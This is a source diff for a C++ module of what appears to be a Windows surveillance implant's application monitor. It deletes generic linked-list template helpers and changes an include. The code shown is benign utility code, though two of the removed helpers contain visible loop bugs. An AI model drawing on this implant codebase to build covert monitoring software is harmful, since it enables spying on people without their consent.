@@ -3,7 +3,6 @@
 #include <Windows.h>
 #include <cJSON/cJSON.h>
 #include <time.h>
-#include <listentry.h>
 #include "../../H4DLL/common.h"
 #include "../../H4DLL/H4-DLL.h"
 #include "../../H4DLL/bss.h"
@@ -11,6 +10,7 @@
 #include "../../H4DLL/HM_IpcModule.h"
 #include "../../H4DLL/HM_InbundleHook.h"
 #include <rcs/bin_string.h>
+#include <rcs/list.h>
 #include "../../H4DLL/LOG.h"
 
 BOOL bPM_ApplicationStarted = FALSE; // Flag che indica se il monitor e' attivo o meno
@@ -37,96 +37,6 @@ struct LANGANDCODEPAGE
 };
 
 static LIST_ENTRY entries = { &entries, &entries };
-
-template<typename T, typename Fn, typename... Args>
-T* find_entry_in_list(LIST_ENTRY* head, Fn f, Args... args)
-{
-	LIST_ENTRY* entry = head->Flink;
-
-	while (entry != head)
-	{
-		T* curr = CONTAINING_RECORD(entry, T, entry);
-		if (f(curr, args...))
-			return curr;
-
-		entry = entry->Flink;
-	}
-
-	return NULL;
-}
-
-template<typename T, typename Fn>
-void apply_in_list(LIST_ENTRY* head, Fn f)
-{
-	LIST_ENTRY* entry = head->Flink;
-
-	while (entry != head)
-	{
-		T* curr = CONTAINING_RECORD(entry, T, entry);
-		f(curr);
-		entry = entry->Flink;
-	}
-
-	return;
-}
-
-template<typename T, typename Fn>
-void search_and_change(LIST_ENTRY* head, Fn search, Fn transform)
-{
-	LIST_ENTRY* entry = head->Flink;
-
-	while (entry != head)
-	{
-		T* curr = CONTAINING_RECORD(entry, T, entry);
-		if (search(curr))
-			transform(curr);
-
-		entry = entry->Flink;
-	}
-
-	return;
-}
-
-
-template<typename T, typename Fn>
-void remove_all(LIST_ENTRY* head, Fn dealloc)
-{
-	LIST_ENTRY* entry = head->Flink;
-	
-	while (entry != head)
-	{
-		T* curr = CONTAINING_RECORD(entry, T, entry);
-
-		RemoveEntryList(entry);
-		dealloc((void *)curr);
-	}
-}
-
-template<typename T>
-void insert(LIST_ENTRY* head, T* value)
-{
-	LIST_ENTRY* entry = head->Flink;
-
-	while (entry != head)
-	{
-		InsertTailList(head, &value->entry);
-	}
-}
-
-size_t list_size(LIST_ENTRY* head)
-{
-	size_t i = 0;
-
-	LIST_ENTRY* entry = head->Flink;
-
-	while (entry != head)
-	{
-		i++;
-		entry = entry->Flink;
-	}
-
-	return i;
-}
 
 static void GetProcessDescription(DWORD PID, WCHAR *description, DWORD desc_len_in_word)
 {
